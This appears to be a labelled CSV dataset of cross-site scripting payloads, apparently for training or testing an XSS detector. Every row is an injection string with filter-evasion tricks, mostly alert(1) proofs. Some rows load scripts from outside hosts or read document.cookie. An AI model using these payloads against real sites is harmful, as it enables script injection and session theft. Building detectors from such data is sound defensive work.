payload,label
"&lt;SCRIPT&gt;alert(String.fromCharCode(88,83,83))&lt;/SCRIPT&gt;",1
"<label oncontextmenu=""alert(1)"">test</label>",1
"<xmp onkeyup=""alert(1)"" contenteditable>test</xmp>",1
&lt;SCRIPT&gt;alert(&apos;XSS&apos;)&lt;/SCRIPT&gt;,1
"<style>@keyframes x{}</style><dfn style=""animation-name:x"" onanimationstart=""alert(1)""></dfn>",1
<a id=x tabindex=1 onactivate=alert(1)></a>,1
"<span draggable=""true"" ondrag=""alert(1)"">test</span>",1
"<canvas onkeypress=""alert(1)"" contenteditable>test</canvas>",1
"<style>@keyframes slidein {}</style><i style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></i>",1
"<div draggable=""true"" contenteditable>drag me</div><svg ondragover=alert(1) contenteditable>drop here</svg>",1
"<dir draggable=""true"" ondragenter=""alert(1)"">test</dir>",1
"<footer onkeyup=""alert(1)"" contenteditable>test</footer>",1
"<i oncut=""alert(1)"" contenteditable>test</i>",1
<svg><abbr onload=alert(1)></abbr>,1
"<slot onkeypress=""alert(1)"" contenteditable>test</slot>",1
"<kbd onmousedown=""alert(1)"">test</kbd>",1
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><mark id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></mark>",1
"<script\x2Ftype=""text/javascript"">javascript:alert(1);</script>",1
"<rtc onmouseout=""alert(1)"">test</rtc>",1
<body onorientationchange=alert(1)>,1
<svg><html onload=alert(1)></html>,1
"<comment><img src=""</comment><img src=x onerror=javascript:alert(1))//"">",1
"<font onmouseup=""alert(1)"">test</font>",1
"<caption onmouseout=""alert(1)"">test</caption>",1
"<div draggable=""true"" contenteditable>drag me</div><ol ondragover=alert(1) contenteditable>drop here</ol>",1
<em id=x tabindex=1 onfocus=alert(1)></em>,1
"<meter onmouseup=""alert(1)"">test</meter>",1
"<style>@keyframes slidein {}</style><xss style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></xss>",1
"<a href=""\x06javascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",1
"<style>@keyframes x{}</style><meter style=""animation-name:x"" onanimationstart=""alert(1)""></meter>",1
<;SCRIPT>;a=/XSS/,1
"<a href=""javas\x0Dcript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",1
"<figure onkeyup=""alert(1)"" contenteditable>test</figure>",1
"<address draggable=""true"" ondrag=""alert(1)"">test</address>",1
"<h1 onkeyup=""alert(1)"" contenteditable>test</h1>",1
"<bdi onmouseover=""alert(1)"">test</bdi>",1
"<div draggable=""true"" contenteditable>drag me</div><wbr ondrop=alert(1) contenteditable>drop here</wbr>",1
<audio src=1 onerror=alert(1)>,1
"<style>@keyframes x{}</style><multicol style=""animation-name:x"" onanimationstart=""alert(1)""></multicol>",1
"<base oncopy=""alert(1)"" contenteditable>test</base>",1
<svg><table onload=alert(1)></table>,1
"<style>:target {color:red;}</style><address id=x style=""transition:color 1s"" ontransitionend=alert(1)></address>",1
"<aside oncontextmenu=""alert(1)"">test</aside>",1
"<style>@keyframes x{}</style><aside style=""animation-name:x"" onanimationstart=""alert(1)""></aside>",1
"""`'><script>\xE2\x80\x85javascript:alert(1)</script>",1
"<ol onmouseleave=""alert(1)"">test</ol>",1
"<a href=""javascript&colon;\u0061&#x6C;&#101%72t&lpar;1&rpar;""><button>",1
"<a href=""javascript\x3A:javascript:alert(1)"" id=""fuzzelement1"">test</a>",1
<IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>,1
<object data=javascript&colon;\u0061&#x6C;&#101%72t(1)>,1
"""`'><script>\xE2\x80\x83javascript:alert(1)</script>",1
"<sub onmouseover=""alert(1)"">test</sub>",1
"<style>:target {color: red;}</style><multicol id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></multicol>",1
"<area onbeforepaste=""alert(1)"" contenteditable>test</area>",1
"<command onmouseout=""alert(1)"">test</command>",1
<img src=foo.png onerror=alert(/xssed/) />,1
"<STYLE>li {list-style-image: url(""javascript:javascript:alert(1)"");}</STYLE><UL><LI>XSS",1
"<svg onbeforecut=""alert(1)"" contenteditable>test</svg>",1
"<style>@keyframes slidein {}</style><embed style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></embed>",1
"<thead onbeforecopy=""alert(1)"" contenteditable>test</thead>",1
"<data onbeforecopy=""alert(1)"" contenteditable>test</data>",1
<blockquote id=x tabindex=1 onfocus=alert(1)></blockquote>,1
"<div draggable=""true"" contenteditable>drag me</div><label ondragover=alert(1) contenteditable>drop here</label>",1
"<script>document.write(""<SCRI"");</SCRIPT>PT SRC=""http://www.securitycompass.com/xss.js""></script>",1
"<label draggable=""true"" ondragleave=""alert(1)"">test</label>",1
"<img src=x onerror=\x00""javascript:alert(1)"">",1
"<div draggable=""true"" contenteditable>drag me</div><i ondrop=alert(1) contenteditable>drop here</i>",1
<image id=x tabindex=1 onbeforedeactivate=alert(1)></image><input autofocus>,1
"<q onmouseout=""alert(1)"">test</q>",1
"<bdo draggable=""true"" ondragstart=""alert(1)"">test</bdo>",1
"<div draggable=""true"" contenteditable>drag me</div><colgroup ondragover=alert(1) contenteditable>drop here</colgroup>",1
"<ul oncut=""alert(1)"" contenteditable>test</ul>",1
<embed src=javascript:alert(1)>,1
"<li oncontextmenu=""alert(1)"">test</li>",1
"<plaintext draggable=""true"" ondrag=""alert(1)"">test</plaintext>",1
"<shadow onmouseenter=""alert(1)"">test</shadow>",1
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><q id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></q>",1
"<style>:target {color:red;}</style><rb id=x style=""transition:color 1s"" ontransitionend=alert(1)></rb>",1
<address id=x tabindex=1 onbeforeactivate=alert(1)></address>,1
"<rtc onmouseleave=""alert(1)"">test</rtc>",1
"<blockquote onbeforecut=""alert(1)"" contenteditable>test</blockquote>",1
"<rp draggable=""true"" ondragstart=""alert(1)"">test</rp>",1
"<style>:target {transform: rotate(180deg);}</style><cite id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></cite>",1
<bgsound id=x tabindex=1 onbeforeactivate=alert(1)></bgsound>,1
"<u draggable=""true"" ondragstart=""alert(1)"">test</u>",1
"<hgroup draggable=""true"" ondragstart=""alert(1)"">test</hgroup>",1
<body id=x tabindex=1 onfocus=alert(1)></body>,1
"<? foo=""><script>javascript:alert(1)</script>"">",1
<h1 id=x tabindex=1 onbeforedeactivate=alert(1)></h1><input autofocus>,1
"<dt onclick=""alert(1)"">test</dt>",1
"<mark draggable=""true"" ondrag=""alert(1)"">test</mark>",1
"<style>:target {color:red;}</style><audio id=x style=""transition:color 1s"" ontransitionend=alert(1)></audio>",1
<tbody id=x tabindex=1 onfocusin=alert(1)></tbody>,1
&#0060,1
"<hgroup onclick=""alert(1)"">test</hgroup>",1
"<style>@keyframes x{}</style><fieldset style=""animation-name:x"" onanimationend=""alert(1)""></fieldset>",1
"<html draggable=""true"" ondragend=""alert(1)"">test</html>",1
"<label onkeydown=""alert(1)"" contenteditable>test</label>",1
"<applet onError applet onError=""javascript:javascript:alert(1)""></applet onError>",1
"<menu onpaste=""alert(1)"" contenteditable>test</menu>",1
<image src/onerror=alert(1)>,1
"<applet onclick=""alert(1)"">test</applet>",1
"<head onbeforepaste=""alert(1)"" contenteditable>test</head>",1
<button id=x tabindex=1 ondeactivate=alert(1)></button><input id=y autofocus>,1
"<hr draggable=""true"" ondragstart=""alert(1)"">test</hr>",1
"<label onkeyup=""alert(1)"" contenteditable>test</label>",1
"<textarea draggable=""true"" ondragend=""alert(1)"">test</textarea>",1
'-alert(1)//,1
"<blockquote onkeydown=""alert(1)"" contenteditable>test</blockquote>",1
<nobr id=x tabindex=1 onactivate=alert(1)></nobr>,1
"<meta charset=""x-imap4-modified-utf7"">&<script&S1&TS&1>alert&A7&(1)&R&UA;&&<&A9&11/script&X&>",1
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><param id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></param>",1
"<div style=""binding: url([link to code]);"">",1
"<colgroup onmouseout=""alert(1)"">test</colgroup>",1
"<option onkeydown=""alert(1)"" contenteditable>test</option>",1
"<wbr oncopy=""alert(1)"" contenteditable>test</wbr>",1
"<style>:target {transform: rotate(180deg);}</style><frame id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></frame>",1
"<basefont onmousemove=""alert(1)"">test</basefont>",1
<form id=x tabindex=1 onactivate=alert(1)></form>,1
"<svg onmouseleave=""alert(1)"">test</svg>",1
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><style id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></style>",1
<details onfocusout=alert(1) tabindex=1 id=x></details><input autofocus>,1
<hr id=x tabindex=1 onbeforeactivate=alert(1)></hr>,1
"<menuitem onbeforecopy=""alert(1)"" contenteditable>test</menuitem>",1
"echo('IPT&gt;alert(\""XSS\"")&lt;/SCRIPT&gt;'); ?&gt;",1
"<img src=x\x10onerror=""javascript:alert(1)"">",1
&lt;IMG SRC=javascript:alert(&apos;XSS&apos;)&gt;,1
"<title onmouseleave=""alert(1)"">test</title>",1
"<textarea onmouseleave=""alert(1)"">test</textarea>",1
"<command onclick=""alert(1)"">test</command>",1
"<em onkeydown=""alert(1)"" contenteditable>test</em>",1
<optgroup id=x tabindex=1 onactivate=alert(1)></optgroup>,1
<address onfocusout=alert(1) tabindex=1 id=x></address><input autofocus>,1
"<param draggable=""true"" ondragenter=""alert(1)"">test</param>",1
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><font id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></font>",1
<applet id=x tabindex=1 ondeactivate=alert(1)></applet><input id=y autofocus>,1
<acronym id=x tabindex=1 onbeforedeactivate=alert(1)></acronym><input autofocus>,1
<button id=x tabindex=1 onbeforedeactivate=alert(1)></button><input autofocus>,1
"<div onpaste=""alert(1)"" contenteditable>test</div>",1
"<table onmouseup=""alert(1)"">test</table>",1
"<i onmouseout=""alert(1)"">test</i>",1
"<dd oncopy=""alert(1)"" contenteditable>test</dd>",1
"<form onmousemove=""alert(1)"">test</form>",1
"<kbd onmouseover=""alert(1)"">test</kbd>",1
<picture id=x tabindex=1 ondeactivate=alert(1)></picture><input id=y autofocus>,1
<svg><audio onload=alert(1)></audio>,1
"exp/*<A STYLE='no\xss:noxss(""*//*"");xss:ex/*XSS*//*/*/pression(alert(""XSS""))'>",1
"<dd onbeforecopy=""alert(1)"" contenteditable>test</dd>",1
"<div draggable=""true"" contenteditable>drag me</div><legend ondrop=alert(1) contenteditable>drop here</legend>",1
"<form draggable=""true"" ondragenter=""alert(1)"">test</form>",1
"<a href=""javas\x06cript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",1
<td id=x tabindex=1 onfocus=alert(1)></td>,1
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><listing id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></listing>",1
<;SCRIPT SRC=http://ha.ckers.org/xss.js>;<;/SCRIPT>;,1
"<meter onpaste=""alert(1)"" contenteditable>test</meter>",1
"<font onbeforecut=""alert(1)"" contenteditable>test</font>",1
"<marquee onmousedown=""alert(1)"">test</marquee>",1
"<object onmouseleave=""alert(1)"">test</object>",1
"<style>@keyframes x{}</style><del style=""animation-name:x"" onanimationstart=""alert(1)""></del>",1
"<samp onmouseup=""alert(1)"">test</samp>",1
"<xmp onclick=""alert(1)"">test</xmp>",1
"<blink onbeforecopy=""alert(1)"" contenteditable>test</blink>",1
"<noembed draggable=""true"" ondragend=""alert(1)"">test</noembed>",1
"<img oncut=""alert(1)"" contenteditable>test</img>",1
"<object onclick=""alert(1)"">test</object>",1
"<div draggable=""true"" contenteditable>drag me</div><header ondrop=alert(1) contenteditable>drop here</header>",1
<iframe<?php echo chr(11)?> onload=alert('XSS')></iframe>,1
<acronym id=x tabindex=1 onactivate=alert(1)></acronym>,1
"<nobr onmouseup=""alert(1)"">test</nobr>",1
"<meta ondblclick=""alert(1)"">test</meta>",1
"<sup onkeypress=""alert(1)"" contenteditable>test</sup>",1
&lt;A HREF=&quot;http://0102.0146.0007.00000223/&quot;&gt;XSS&lt;/A&gt;,1
"<multicol onmouseover=""alert(1)"">test</multicol>",1
“><<script>alert(document.cookie);//<</script>,1
<form><input formaction=javascript:alert(1) type=image value=click>,1
"<style>@keyframes x{}</style><title style=""animation-name:x"" onanimationend=""alert(1)""></title>",1
"<track oncopy=""alert(1)"" contenteditable>test</track>",1
<legend id=x tabindex=1 onactivate=alert(1)></legend>,1
"<fieldset onmouseleave=""alert(1)"">test</fieldset>",1
"<marquee draggable=""true"" ondragenter=""alert(1)"">test</marquee>",1
"<noscript draggable=""true"" ondragenter=""alert(1)"">test</noscript>",1
"""`'><script>\xE2\x80\xA8javascript:alert(1)</script>",1
"<rb onbeforecut=""alert(1)"" contenteditable>test</rb>",1
"<tfoot draggable=""true"" ondragend=""alert(1)"">test</tfoot>",1
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><datalist id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></datalist>",1
"<plaintext oncopy=""alert(1)"" contenteditable>test</plaintext>",1
"<form><a href=""javascript:\u0061lert&#x28;1&#x29;"">X</script><img/*/src=""worksinchrome&colon;prompt&#x28;1&#x29;""/*/onerror='eval(src)'>",1
"<style>@keyframes x{}</style><hr style=""animation-name:x"" onanimationend=""alert(1)""></hr>",1
"<big onpaste=""alert(1)"" contenteditable>test</big>",1
"<p draggable=""true"" ondrag=""alert(1)"">test</p>",1
"<IMG SRC=x onstalled=""alert(String.fromCharCode(88,83,83))"">",1
"<style>:target {transform: rotate(180deg);}</style><thead id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></thead>",1
<isindex id=x tabindex=1 onbeforedeactivate=alert(1)></isindex><input autofocus>,1
"<noframes onmouseenter=""alert(1)"">test</noframes>",1
"<li onmousedown=""alert(1)"">test</li>",1
"<legend onmouseenter=""alert(1)"">test</legend>",1
<img SRC='vbscript:document.vulnerable=true;'>,1
<content id=x tabindex=1 ondeactivate=alert(1)></content><input id=y autofocus>,1
"<ruby onbeforepaste=""alert(1)"" contenteditable>test</ruby>",1
"<summary ondblclick=""alert(1)"">test</summary>",1
"<img onclick=""alert(1)"">test</img>",1
"<main onmouseout=""alert(1)"">test</main>",1
"<ol oncopy=""alert(1)"" contenteditable>test</ol>",1
"<style>@keyframes slidein {}</style><basefont style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></basefont>",1
<img src=`xx:xx`onerror=alert(1)>,1
&lt;SCRIPT SRC=http&#58;//ha&#46;ckers&#46;org/xss&#46;js&gt;&lt;/SCRIPT&gt;,1
"<mark onkeypress=""alert(1)"" contenteditable>test</mark>",1
<content id=x tabindex=1 onbeforedeactivate=alert(1)></content><input autofocus>,1
<noframes onblur=alert(1) tabindex=1 id=x></noframes><input autofocus>,1
<progress id=x tabindex=1 onbeforedeactivate=alert(1)></progress><input autofocus>,1
"<a oncut=""alert(1)"" contenteditable>test</a>",1
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><dialog id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></dialog>",1
"<data onmouseenter=""alert(1)"">test</data>",1
"<ruby onkeydown=""alert(1)"" contenteditable>test</ruby>",1
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><button id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></button>",1
"<rp onmousemove=""alert(1)"">test</rp>",1
"<nobr draggable=""true"" ondragleave=""alert(1)"">test</nobr>",1
"<DIV STYLE=""width:expression(javascript:alert(1));"">",1
<ruby id=x tabindex=1 onactivate=alert(1)></ruby>,1
"<header onbeforepaste=""alert(1)"" contenteditable>test</header>",1
<svg><dd onload=alert(1)></dd>,1
"<slot onbeforepaste=""alert(1)"" contenteditable>test</slot>",1
1<set/xmlns=`urn:schemas-microsoft-com:time` style=`beh&#x41vior:url(#default#time2)` attributename=`innerhtml` to=`&lt;img/src=&quot;x&quot;onerror=javascript:alert(1)&gt;`>,1
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><track id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></track>",1
<;BODY ONLOAD=alert(';XSS';)>;,1
"<code draggable=""true"" ondrag=""alert(1)"">test</code>",1
"<style>:target {color:red;}</style><frameset id=x style=""transition:color 1s"" ontransitionend=alert(1)></frameset>",1
<img/&#09;&#10;&#11; src=`~` onerror=prompt(1)>,1
"<?xml version=""1.0"" encoding=""ISO-8859-1""?><foo><![CDATA[<]]>SCRIPT<![CDATA[>]]>alert('gotcha');<![CDATA[<]]>/SCRIPT<![CDATA[>]]></foo>",1
"<div draggable=""true"" contenteditable>drag me</div><noembed ondrop=alert(1) contenteditable>drop here</noembed>",1
"""`'><script>\xE2\x80\xAFjavascript:alert(1)</script>",1
"<article draggable=""true"" ondragenter=""alert(1)"">test</article>",1
"<noembed draggable=""true"" ondragstart=""alert(1)"">test</noembed>",1
"<div draggable=""true"" contenteditable>drag me</div><small ondragover=alert(1) contenteditable>drop here</small>",1
"<style>:target {color:red;}</style><u id=x style=""transition:color 1s"" ontransitionend=alert(1)></u>",1
1script3document.vulnerable=true;1/script3,1
"<dialog onkeypress=""alert(1)"" contenteditable>test</dialog>",1
"<style>@keyframes slidein {}</style><object style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></object>",1
"<;A HREF="";http://0x42.0x0000066.0x7.0x93/"";>;XSS<;/A>;",1
"<th oncontextmenu=""alert(1)"">test</th>",1
<isindex type=image onload=alert(1) src=validimage.png>,1
"<small draggable=""true"" ondragstart=""alert(1)"">test</small>",1
"<dfn onkeypress=""alert(1)"" contenteditable>test</dfn>",1
"<IMG SRC=x oncut=""alert(String.fromCharCode(88,83,83))"">",1
"<bgsound oncopy=""alert(1)"" contenteditable>test</bgsound>",1
"<a href=""javas\x07cript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",1
<content id=x tabindex=1 onfocusin=alert(1)></content>,1
"<div STYLE=""background-image: url(&#1;javascript:document.vulnerable=true;)"">",1
"<var ondblclick=""alert(1)"">test</var>",1
"<footer onmouseout=""alert(1)"">test</footer>",1
<time id=x tabindex=1 onbeforeactivate=alert(1)></time>,1
"<xmp oncut=""alert(1)"" contenteditable>test</xmp>",1
<html><noalert><noscript>(123)</noscript><script>(123)</script>,1
"ABC<div style=""x:\x00expression(javascript:alert(1)"">DEF",1
"<time onkeyup=""alert(1)"" contenteditable>test</time>",1
"<div draggable=""true"" contenteditable>drag me</div><video ondragover=alert(1) contenteditable>drop here</video>",1
"<div draggable=""true"" contenteditable>drag me</div><pre ondragover=alert(1) contenteditable>drop here</pre>",1
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><frameset id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></frameset>",1
&#x03c,1
"<script/src=data&colon;text/j\u0061v\u0061&#115&#99&#114&#105&#112&#116,\u0061%6C%65%72%74(/XSS/)></script ????????????",1
"<style>:target {color:red;}</style><option id=x style=""transition:color 1s"" ontransitionend=alert(1)></option>",1
<b id=x tabindex=1 onfocus=alert(1)></b>,1
"<p onmousemove=""alert(1)"">test</p>",1
"<textarea draggable=""true"" ondragstart=""alert(1)"">test</textarea>",1
"<base draggable=""true"" ondrag=""alert(1)"">test</base>",1
<figure id=x tabindex=1 onfocusin=alert(1)></figure>,1
"<keygen onmousemove=""alert(1)"">test</keygen>",1
<scr<script>ipt>alert(1)</scr</script>ipt>,1
"<colgroup onmouseenter=""alert(1)"">test</colgroup>",1
"<frame onmouseout=""alert(1)"">test</frame>",1
"<title onbeforepaste=""alert(1)"" contenteditable>test</title>",1
<~/XSS/*-*/STYLE=xss:e/**/xpression(alert('XSS'))>,1
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><header id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></header>",1
"<IMG SRC=x onresize=""alert(String.fromCharCode(88,83,83))"">",1
"<div draggable=""true"" contenteditable>drag me</div><figure ondragover=alert(1) contenteditable>drop here</figure>",1
"<object onmouseover=""alert(1)"">test</object>",1
"&lt;IFRAME SRC=\""javascript&#058;alert('XSS');\""&gt;&lt;/IFRAME&gt;",1
"<style>@keyframes x{}</style><hgroup style=""animation-name:x"" onanimationstart=""alert(1)""></hgroup>",1
"<;BODY onload!#$%&;()*~+-_.,:;?@[/|\]^`=alert("";XSS"";)>;",1
<;IMG RC=&;#106;&;#97;&;#118;&;#97;&;#115;&;#99;&;#114;&;#105;&;#112;&;#116;&;#58;&;#97;&;#108;&;#101;&;#114;&;#116;&;#40;&;#39;&;#88;&;#83;&;#83;&;#39;&;#41;>;,1
"<shadow ondblclick=""alert(1)"">test</shadow>",1
"<div draggable=""true"" contenteditable>drag me</div><del ondragover=alert(1) contenteditable>drop here</del>",1
"<style>:target {color: red;}</style><sub id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></sub>",1
"<script> var+xmlHttp+=+null; try+{ xmlHttp+=+new+XMLHttpRequest(); }+catch(e)+{} if+(xmlHttp)+{ xmlHttp.open('GET',+'/xssme2',+true); xmlHttp.onreadystatechange+=+function+()+{ if+(xmlHttp.readyState+==+4)+{ xmlHttp.responseText.match(/document.cookie%5Cs%2B=%5Cs%2B'(.*)'/gi); alert(RegExp.%241); } } xmlHttp.send(null); }; </script>",1
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><noframes id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></noframes>",1
"<style></style\x3E<img src=""about:blank"" onerror=javascript:alert(1)//></style>",1
"<form onmouseleave=""alert(1)"">test</form>",1
"<style>:target {color:red;}</style><i id=x style=""transition:color 1s"" ontransitionend=alert(1)></i>",1
"<style>:target {transform: rotate(180deg);}</style><summary id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></summary>",1
"<script src=""//brutelogic.com.br&sol;1.js&num;",1
"<embed onpaste=""alert(1)"" contenteditable>test</embed>",1
"<head oncopy=""alert(1)"" contenteditable>test</head>",1
"<datalist draggable=""true"" ondrag=""alert(1)"">test</datalist>",1
"<input oncopy=alert(1) value=""XSS"" autofocus>",1
"<main onclick=""alert(1)"">test</main>",1
"<script>Object.defineProperties(window, {Safe: {value: {get: function() {return document.cookie}}}});alert(Safe.get())</script>",1
"<div style=""background:url(/f#&#127;oo/;color:red/*/foo.jpg);"">X",1
"<style>@keyframes slidein {}</style><sup style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></sup>",1
"<slot onmouseup=""alert(1)"">test</slot>",1
"<body onload body onload=""javascript:javascript:alert(1)""></body onload>",1
"<keygen onkeydown=""alert(1)"" contenteditable>test</keygen>",1
